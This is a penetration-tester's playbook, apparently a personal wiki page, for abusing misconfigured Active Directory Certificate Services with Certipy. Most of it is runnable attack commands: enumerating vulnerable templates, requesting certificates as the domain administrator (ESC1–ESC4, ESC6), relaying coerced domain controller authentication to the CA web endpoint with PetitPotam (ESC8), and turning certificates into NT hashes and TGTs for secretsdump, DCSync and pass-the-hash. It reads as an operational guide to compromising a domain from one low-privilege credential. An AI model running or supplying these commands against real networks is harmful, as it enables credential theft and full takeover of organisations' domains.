# 🏰 ADCS — Certificate Services Abuse (Certipy)

> **Active Directory Certificate Services** issues certificates that AD trusts for authentication (PKINIT). A misconfigured **certificate template** lets a low-priv user request a cert **as someone else** (e.g. a Domain Admin) — then authenticate as them and recover their NT hash. These are the **ESCx** attacks. One bad template = domain compromise from a single low-priv credential, no password cracking needed.

Part of [[Active Directory]]. Related: [[AD Enumeration]] · [[Kerberos]] · [[AD Lateral Movement]] · [[DCSync & Domain Dominance]] · [[SMB]]

---

## 🧠 THINK
- **Needs one valid domain credential** to enumerate (like [[Kerberoasting]]); some paths (ESC8) need only network access + coercion.
- A CA is just **another server role** — find it via LDAP/`certipy find`. Presence of ADCS ≠ vulnerable; a **misconfigured template** is.
- The payoff isn't a cracked password — it's a **certificate → NT hash / TGT** for the victim. Steal the identity directly.
- **No cracking, no lockout, survives password resets** (a stolen cert is valid until it expires). Quietly brutal.
- Enabled on a box? `certipy find -vulnerable` tells you in one command whether there's an ESC path.

## ⚡ ENUMERATE (always run this first)
```bash
export DOMAIN=corp.local U=jdoe P='Password1' DC=10.10.10.10
```

```bash
# The money command — finds CA(s), templates, and flags every ESC misconfig
certipy find -u $U@$DOMAIN -p $P -dc-ip $DC -stdout -vulnerable
```

```bash
# Full detail (all templates, not just vulnerable) + JSON/BloodHound output files
certipy find -u $U@$DOMAIN -p $P -dc-ip $DC -enabled
```

```bash
# Via certutil from a Windows foothold (no certipy)
certutil -config - -ping            # list CAs
certutil -template                  # dump templates
```

```bash
# Is ADCS even present? (LDAP)
netexec ldap $DC -u $U -p $P -M adcs
```
**Look for in `find` output:** `[!] Vulnerabilities` → `ESC1`/`ESC2`/`ESC3`/`ESC4`/`ESC6`/`ESC8`…, the **CA name** (`-ca`), the **template name** (`-template`), and `Enrollment Rights` that include your user / `Domain Users` / `Authenticated Users`.

---

## 🗡️ THE ESC PATHS (what to do per finding)

### 🟢 HIGH PROB — ESC1: template allows requester-supplied SAN
Template has `Client Authentication` EKU + `ENROLLEE_SUPPLIES_SUBJECT` and you have enroll rights → request a cert **as the Domain Admin**:
```bash
# 1) Request a cert specifying an arbitrary UPN (the victim)
certipy req -u $U@$DOMAIN -p $P -dc-ip $DC -ca 'CA-NAME' -template 'VulnTemplate' -upn administrator@$DOMAIN
```

```bash
# 2) Authenticate with the issued .pfx → get the victim's TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip $DC
```
Result: `administrator`'s **NT hash** and a TGT → PtH / `secretsdump` → domain compromise.
> On patched 2019+/2022 DCs (StrongCertificateBindingEnforcement) `-upn` alone may fail → add `-sid <victim-SID>`, or use ESC9/ESC10 paths.

### 🟢 HIGH PROB — ESC8: NTLM relay to the CA web endpoint (no cert template needed)
CA runs the HTTP enrollment endpoint (`/certsrv`) without EPA → relay a **coerced machine auth** to it and get a cert for the DC's machine account:
```bash
# 1) Start the relay at the CA's web enrollment
certipy relay -target 'http://CA-HOST' -template DomainController
```

```bash
# 2) Coerce the DC to authenticate to you (pick one)
coercer coerce -u $U -p $P -t $DC -l <YOUR_IP>
# PetitPotam / printerbug also work:
python3 PetitPotam.py <YOUR_IP> $DC
```

```bash
# 3) Auth with the relayed DC machine cert → DC$ TGT → DCSync
certipy auth -pfx 'dc.pfx' -dc-ip $DC
```
Result: DC machine account cert → `DC$` → [[DCSync & Domain Dominance]].

### 🟡 MED PROB — ESC2 / ESC3: Any Purpose / Enrollment Agent EKU
- **ESC2:** template has `Any Purpose` (or no) EKU → same flow as ESC1 (`certipy req ... -upn victim`).
- **ESC3:** template grants the **Certificate Request Agent** EKU → request an agent cert, then request **on behalf of** another user:
```bash
certipy req -u $U@$DOMAIN -p $P -ca 'CA-NAME' -template 'EnrollmentAgent'
```
```bash
certipy req -u $U@$DOMAIN -p $P -ca 'CA-NAME' -template 'User' -on-behalf-of 'CORP\administrator' -pfx agent.pfx
```

### 🟡 MED PROB — ESC4: you have write access over a template
Enrollment template is writable by your user (seen in BloodHound / `find`) → **make it vulnerable**, exploit, restore:
```bash
certipy template -u $U@$DOMAIN -p $P -template 'VulnTemplate' -save-old   # reconfigure to ESC1-able
# ...run ESC1 request+auth...
certipy template -u $U@$DOMAIN -p $P -template 'VulnTemplate' -configuration VulnTemplate.json  # restore
```

### 🔵 SITUATIONAL — ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2
CA-wide flag that lets **any** template accept a SAN → treat any `Client Authentication` template as ESC1. (`find` flags it on the CA.)

### 🔵 SITUATIONAL — have a PFX/cert already? Just authenticate
```bash
certipy auth -pfx user.pfx -dc-ip $DC              # cert → NT hash + TGT
```

---

## 🔑 CERT → EVERYTHING
Once `certipy auth` prints an NT hash and drops a `.ccache`:
```bash
export KRB5CCNAME=administrator.ccache            # use the TGT
```

```bash
impacket-secretsdump -k -no-pass $DOMAIN/administrator@$DC   # or PtH with the NT hash
```

```bash
netexec smb $DC -u administrator -H '<NThash>'    # (Pwn3d!) → psexec/wmiexec
```
Hash/TGT → [[AD Lateral Movement]] · [[DCSync & Domain Dominance]] · spray via [[Credential Attacks]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT |
|---|---|---|
| `ESC1` + enroll rights | SAN-spoofable template | `certipy req -upn administrator@dom` → `auth` → NT hash |
| `ESC8` + web enrollment | relay target | coerce DC → `certipy relay` → DC$ → DCSync |
| `ESC2/ESC3` | Any-Purpose / agent EKU | request as/on-behalf-of victim |
| `ESC4` (writable template) | you can arm it | `certipy template` → ESC1 → restore |
| `ESC6` on CA | SAN accepted anywhere | treat any auth template as ESC1 |
| You hold a `.pfx` | stolen identity | `certipy auth -pfx` → hash + TGT |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `find` shows no vulnerabilities | ADCS present but hardened → pivot to [[Kerberoasting]] / [[AD ACL Abuse]] |
| `auth` fails on 2019/2022 DC | StrongCertificateBinding — add `-sid <victim SID>`; look at ESC9/ESC10 |
| Clock skew (`KRB_AP_ERR_SKEW`) | `sudo ntpdate $DC` (or `rdate -n $DC`) before requesting |
| DNS / CA host won't resolve | add DC + CA FQDN to `/etc/hosts`; pass `-dns-tcp`/`-ns $DC` to certipy |
| Relay gets no connection | coercion failed — try `printerbug.py` / `PetitPotam.py` / `coercer`; confirm your listener IP |
| Can't find the CA name | `certipy find -stdout` header, or `certutil -config - -ping` from a Windows shell |

## ⚠️ COMMON MISTAKES
- Seeing ADCS and assuming it's exploitable — **run `find -vulnerable`**, let it tell you.
- Not adding the **CA host** to `/etc/hosts` (requests silently fail to resolve).
- Forgetting `-sid` on patched DCs and concluding ESC1 "doesn't work."
- Cracking the cert like a hash — you don't; **`certipy auth`** turns it into an NT hash for you.
- Ignoring ESC8 because you "have no creds" — it only needs coercion + the web endpoint.

## 📇 CHEAT SHEET
```bash
certipy find -u $U@$DOMAIN -p $P -dc-ip $DC -stdout -vulnerable
```
```bash
certipy req  -u $U@$DOMAIN -p $P -ca 'CA-NAME' -template 'Vuln' -upn administrator@$DOMAIN
```
```bash
certipy auth -pfx administrator.pfx -dc-ip $DC          # → NT hash + TGT
```
```bash
certipy relay -target http://CA-HOST -template DomainController   # ESC8 (+ coerce DC)
```
```bash
impacket-secretsdump -k -no-pass $DOMAIN/administrator@$DC
```
**Kill shot:** 1 low-priv cred → `find -vulnerable` → ESC1 request as admin → `auth` → NT hash → DCSync. No cracking, no lockout.
